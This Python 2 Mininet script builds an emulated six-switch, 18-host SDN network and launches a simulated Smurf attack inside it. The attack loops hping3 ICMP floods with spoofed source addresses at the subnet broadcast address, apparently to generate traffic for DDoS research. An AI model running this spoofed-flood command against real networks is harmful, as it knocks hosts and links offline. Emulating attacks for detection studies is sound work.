# -*- coding: utf-8 -*-
from mininet.topo import Topo
from mininet.net import Mininet
from mininet.link import TCLink
from mininet.log import setLogLevel
from mininet.node import OVSKernelSwitch, RemoteController
from time import sleep
from datetime import datetime
from random import randrange, choice

class MyTopo(Topo):
    def build(self):
        switches = []
        for i in range(6):
            s_name = 's%d' % (i+1)
            s = self.addSwitch(s_name,
                               cls=OVSKernelSwitch,
                               protocols='OpenFlow13')
            switches.append(s)
            for j in range(3):
                idx = i*3 + j + 1
                h_name = 'h%d' % idx
                mac    = '00:00:00:00:00:%02x' % idx
                ip     = '10.0.0.%d/24' % idx
                self.addHost(h_name, cpu=1.0/20, mac=mac, ip=ip)
                self.addLink(h_name, s_name)
        for k in range(len(switches)-1):
            self.addLink(switches[k], switches[k+1])
            

def ip_generator():
    ip = ".".join(["10", "0", "0", str(randrange(1, 4))])
    return ip

def start_smurf():
    net = Mininet(topo=MyTopo(),
                  link=TCLink,
                  controller=RemoteController('c0',
                                              ip='192.168.1.153',
                                              port=6653))
    net.start()
    hosts     = [ net.get('h%d' % i) for i in range(1,19) ]
    broadcast = '10.0.0.255'
    for i in range(1, 300):
        src       = choice(hosts)
        spoof_src = ip_generator()
        print '[*] Smurf #%d: attacker=%s spoof=%s -> %s' % (
            i, src.name, spoof_src, broadcast)
        cmd = 'timeout 5s hping3 -1 --flood -a %s %s' % (
            spoof_src, broadcast)
        src.cmd(cmd)
        sleep(2)
    net.stop()

if __name__ == '__main__':
    setLogLevel('info')
    start_smurf()

